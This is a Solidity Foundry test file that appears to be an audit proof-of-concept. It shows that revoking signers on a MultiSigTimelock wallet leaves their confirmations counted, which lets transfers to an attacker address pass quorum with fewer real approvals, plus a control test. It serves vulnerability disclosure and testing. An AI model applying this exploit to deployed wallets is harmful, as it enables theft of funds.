// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";
import {MultiSigTimelock} from "src/MultiSigTimelock.sol";

/// @title DuoLaSafe PoC suite for MultiSigTimelock
/// @notice Standalone tests (no script imports) proving real vulnerabilities.
contract PoC_DuoLaSafe is Test {
    MultiSigTimelock wallet;

    // OWNER is address(this) because this contract deploys the wallet.
    address OWNER = address(this);
    address S2 = makeAddr("s2");
    address S3 = makeAddr("s3");
    address S4 = makeAddr("s4");
    address ATTACKER = makeAddr("attacker");

    function setUp() public {
        wallet = new MultiSigTimelock();
        // Fund the wallet so transfers can succeed.
        vm.deal(address(wallet), 100 ether);
    }

    // Allow this contract (OWNER / a signer) to receive ETH from executions.
    receive() external payable {}

    // =========================================================================
    // H-01: revokeSigningRole leaves stale confirmations -> quorum is satisfied
    //       by accounts that are NO LONGER signers. Funds drained below true
    //       3-of-N approval.
    // =========================================================================
    function test_H01_StaleConfirmationsAllowExecutionByNonSigners() public {
        // 4 signers total: OWNER, S2, S3, S4
        wallet.grantSigningRole(S2);
        wallet.grantSigningRole(S3);
        wallet.grantSigningRole(S4);
        assertEq(wallet.getSignerCount(), 4);

        // OWNER proposes a transfer of 0.5 ETH (no timelock) to ATTACKER.
        uint256 txId = wallet.proposeTransaction(ATTACKER, 0.5 ether, "");

        // Only TWO legitimate, currently-trusted signers actually approve it:
        // OWNER and S2.
        wallet.confirmTransaction(txId);
        vm.prank(S2);
        wallet.confirmTransaction(txId);

        // S3 confirmed once but then the owner DECIDED TO REMOVE S3 as a signer
        // (e.g. S3 was compromised / left the org). S3's key should no longer
        // count toward quorum.
        vm.prank(S3);
        wallet.confirmTransaction(txId);
        assertEq(wallet.getTransaction(txId).confirmations, 3);

        // Owner revokes S3's signing role.
        wallet.revokeSigningRole(S3);
        assertFalse(wallet.hasRole(wallet.getSigningRole(), S3));

        // BUG: confirmations was NOT decremented when S3 was removed.
        // The wallet still believes it has 3 confirmations, even though only
        // 2 CURRENT signers (OWNER, S2) ever approved this transaction.
        assertEq(
            wallet.getTransaction(txId).confirmations,
            3,
            "stale confirmation from removed signer still counted"
        );

        uint256 attackerBefore = ATTACKER.balance;

        // A current signer executes. Quorum check passes on a phantom vote.
        wallet.executeTransaction(txId);

        assertEq(ATTACKER.balance, attackerBefore + 0.5 ether);
        assertTrue(wallet.getTransaction(txId).executed);

        // Demonstrated: only 2 current signers truly approved, yet a 3-of-N
        // wallet executed the transfer.
    }

    // =========================================================================
    // H-02: A removed signer's signature flag is never cleared. After being
    //       re-granted the role they CANNOT re-confirm (already-signed guard),
    //       but more importantly the count inflation of H-01 compounds: revoke
    //       does not undo any confirmation accounting at all. This variant
    //       shows the threshold being met with effectively ONE honest signer
    //       plus role churn.
    // =========================================================================
    function test_H02_QuorumMetWithSingleHonestSignerViaRoleChurn() public {
        // Start: OWNER + S2 + S3 = 3 signers.
        wallet.grantSigningRole(S2);
        wallet.grantSigningRole(S3);

        uint256 txId = wallet.proposeTransaction(ATTACKER, 0.1 ether, "");

        // All three confirm.
        wallet.confirmTransaction(txId);
        vm.prank(S2);
        wallet.confirmTransaction(txId);
        vm.prank(S3);
        wallet.confirmTransaction(txId);
        assertEq(wallet.getTransaction(txId).confirmations, 3);

        // Now owner revokes BOTH S2 and S3. Only OWNER remains a signer.
        wallet.revokeSigningRole(S2);
        wallet.revokeSigningRole(S3);
        assertEq(wallet.getSignerCount(), 1);

        // confirmations is STILL 3 although the wallet now has a single signer.
        assertEq(wallet.getTransaction(txId).confirmations, 3);

        // Single remaining signer executes a "3-of-N" transaction.
        uint256 before = ATTACKER.balance;
        wallet.executeTransaction(txId);
        assertEq(ATTACKER.balance, before + 0.1 ether);
    }

    // =========================================================================
    // CONTROL / adversarial check: confirm the guard DOES work when no role
    // churn happens, so H-01/H-02 are genuinely about stale state, not a
    // missing quorum check entirely.
    // =========================================================================
    function test_Control_QuorumEnforcedWithoutChurn() public {
        wallet.grantSigningRole(S2);
        uint256 txId = wallet.proposeTransaction(ATTACKER, 0.1 ether, "");
        wallet.confirmTransaction(txId);
        vm.prank(S2);
        wallet.confirmTransaction(txId);
        // Only 2 confirmations -> must revert.
        vm.expectRevert(
            abi.encodeWithSelector(
                MultiSigTimelock.MultiSigTimelock__InsufficientConfirmations.selector, 3, 2
            )
        );
        wallet.executeTransaction(txId);
    }
}
